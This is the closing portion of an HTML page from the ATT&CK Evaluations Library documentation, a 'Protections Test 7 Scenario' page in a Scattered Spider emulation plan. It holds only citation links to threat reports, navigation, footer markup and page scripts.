+<td><a href="https://github.com/blackorbird/APT_REPORT/blob/master/summary/2024/crowdstrike-2024-threat-hunting-report.pdf" class="outbound" target="_blank"><span>3</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://blog.eclecticiq.com/ransomware-in-the-cloud-scattered-spider-targeting-insurance-and-financial-industries" class="outbound" target="_blank"><span>4</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a>, <a href="https://permiso.io/blog/lucr-3-scattered-spider-getting-saas-y-in-the-cloud" class="outbound" target="_blank"><span>10</span><svg xmlns="http://www.w3.org/2000/svg" class="retype-outbound-trigger docs-icon ml-1" viewBox="0 0 24 24" role="presentation"><g fill="currentColor"><path d="M15.5 2.25a.75.75 0 0 1 .75-.75h5.5a.75.75 0 0 1 .75.75v5.5a.75.75 0 0 1-1.5 0V4.06l-6.22 6.22a.75.75 0 1 1-1.06-1.06L19.94 3h-3.69a.75.75 0 0 1-.75-.75Z"/><path d="M2.5 4.25c0-.966.784-1.75 1.75-1.75h8.5a.75.75 0 0 1 0 1.5h-8.5a.25.25 0 0 0-.25.25v15.5c0 .138.112.25.25.25h15.5a.25.25 0 0 0 .25-.25v-8.5a.75.75 0 0 1 1.5 0v8.5a1.75 1.75 0 0 1-1.75 1.75H4.25a1.75 1.75 0 0 1-1.75-1.75V4.25Z"/></g></svg></a></td>
+</tr>
+</tbody>
+</table>
+</div>
+
+                                
+                                <!-- Required only on API pages -->
+                                <doc-toolbar-member-filter-no-results></doc-toolbar-member-filter-no-results>
+                            </div>
+                            <footer id="retype-content-footer" class="clear-both">
+                            
+                                <nav id="retype-nextprev" class="print:hidden flex mt-14">
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 h-full flex items-center break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-l-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/scattered_spider/emulation_plan/protections_test_6_scenario/">
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="mr-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19 11H7.41l5.29-5.29a.996.996 0 10-1.41-1.41l-7 7a1 1 0 000 1.42l7 7a1.024 1.024 0 001.42-.01.996.996 0 000-1.41L7.41 13H19c.55 0 1-.45 1-1s-.45-1-1-1z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                            <span>
+                                                <span class="block text-xs font-normal text-base-text-muted">Previous</span>
+                                                <span class="block mt-1">Protections Test 6 Scenario (NOISE ONLY)</span>
+                                            </span>
+                                        </a>
+                                    </div>
+                            
+                                    <div class="w-1/2">
+                                        <a class="px-5 py-4 -mx-px h-full flex items-center justify-end break-normal font-medium text-body-link border border-base-border hover:border-base-border-hover rounded-r-lg transition-colors duration-150 relative hover:z-5" href="../../../../enterprise/scattered_spider/emulation_plan/cleanup_scattered_spider_guide/">
+                                            <span>
+                                                <span class="block text-xs font-normal text-right text-base-text-muted">Next</span>
+                                                <span class="block mt-1">Scattered Spider Cleanup Guide</span>
+                                            </span>
+                                            <svg xmlns="http://www.w3.org/2000/svg" class="ml-3" width="24" height="24" viewBox="0 0 24 24" fill="currentColor" overflow="visible"><path d="M19.92 12.38a1 1 0 00-.22-1.09l-7-7a.996.996 0 10-1.41 1.41l5.3 5.3H5c-.55 0-1 .45-1 1s.45 1 1 1h11.59l-5.29 5.29a.996.996 0 000 1.41c.19.2.44.3.7.3s.51-.1.71-.29l7-7c.09-.09.16-.21.21-.33z" /><path fill="none" d="M0 0h24v24H0z" /></svg>
+                                        </a>
+                                    </div>
+                                </nav>
+                            </footer>
+                        </main>
+                
+                        <div id="retype-page-footer" class="print:border-none border-t border-base-border pt-6 mb-8">
+                            <footer class="flex flex-wrap items-center justify-between print:justify-center">
+                                <div id="retype-footer-links" class="print:hidden">
+                                    <ul class="flex flex-wrap items-center text-sm">
+                                        <li>
+                                            <a class="inline-flex items-center mr-4 py-2 text-sm whitespace-nowrap transition-colors duration-200 ease-linear text-footer-link hover:text-footer-link-hover md:mb-0" href="https://github.com/attackevals/ael">
+                                                <svg xmlns="http://www.w3.org/2000/svg" class="mb-px mr-1" width="18" height="18" viewBox="0 0 24 24" role="presentation">
+                                                    <g fill="currentColor">
+                                                        <path d="M12 1C5.923 1 1 5.923 1 12c0 4.867 3.149 8.979 7.521 10.436.55.096.756-.233.756-.522 0-.262-.013-1.128-.013-2.049-2.764.509-3.479-.674-3.699-1.292-.124-.317-.66-1.293-1.127-1.554-.385-.207-.936-.715-.014-.729.866-.014 1.485.797 1.691 1.128.99 1.663 2.571 1.196 3.204.907.096-.715.385-1.196.701-1.471-2.448-.275-5.005-1.224-5.005-5.432 0-1.196.426-2.186 1.128-2.956-.111-.275-.496-1.402.11-2.915 0 0 .921-.288 3.024 1.128a10.193 10.193 0 0 1 2.75-.371c.936 0 1.871.123 2.75.371 2.104-1.43 3.025-1.128 3.025-1.128.605 1.513.221 2.64.111 2.915.701.77 1.127 1.747 1.127 2.956 0 4.222-2.571 5.157-5.019 5.432.399.344.743 1.004.743 2.035 0 1.471-.014 2.654-.014 3.025 0 .289.206.632.756.522C19.851 20.979 23 16.854 23 12c0-6.077-4.922-11-11-11Z"/>
+                                                    </g>
+                                                </svg>
+                                                <span>ATTACK Evaluations Library GitHub</span>
+                                            </a>
+                                        </li>
+                                    </ul>
+                                </div>
+                                <div id="retype-copyright" class="print:justify-center py-2 text-footer-text font-footer-link-weight text-sm leading-relaxed"><p>© Copyright 2025. All rights reserved.</p></div>
+                            </footer>
+                        </div>
+                    </div>
+                
+                    <!-- Rendered if sidebar right is enabled -->
+                    <!-- Sidebar right skeleton-->
+                    <div v-cloak class="fixed top-0 bottom-0 right-0 translate-x-full bg-sidebar-right-bg border-sidebar-right-border lg:sticky lg:border-l lg:shrink-0 lg:pt-6 lg:transform-none sm:w-1/2 lg:w-64 lg:z-0 md:w-104 sidebar-right skeleton">
+                        <div class="pl-5">
+                            <div class="w-32 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-48 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                            <div class="w-40 h-3 mb-4 bg-skeleton-bg rounded-full loading"></div>
+                        </div>
+                    </div>
+                
+                    <!-- User should be able to hide sidebar right -->
+                    <doc-sidebar-right v-cloak></doc-sidebar-right>
+                </div>
+
+            </div>
+        </div>
+    
+        <doc-search-mobile></doc-search-mobile>
+        <doc-back-to-top></doc-back-to-top>
+    </div>
+
+
+    <div id="retype-overlay-target"></div>
+
+    <script data-cfasync="false">window.__DOCS__ = { "title": "Protections Test 7 Scenario", level: 4, icon: "file", hasPrism: true, hasMermaid: false, hasMath: false, tocDepth: 23 }</script>
+</body>
+</html>
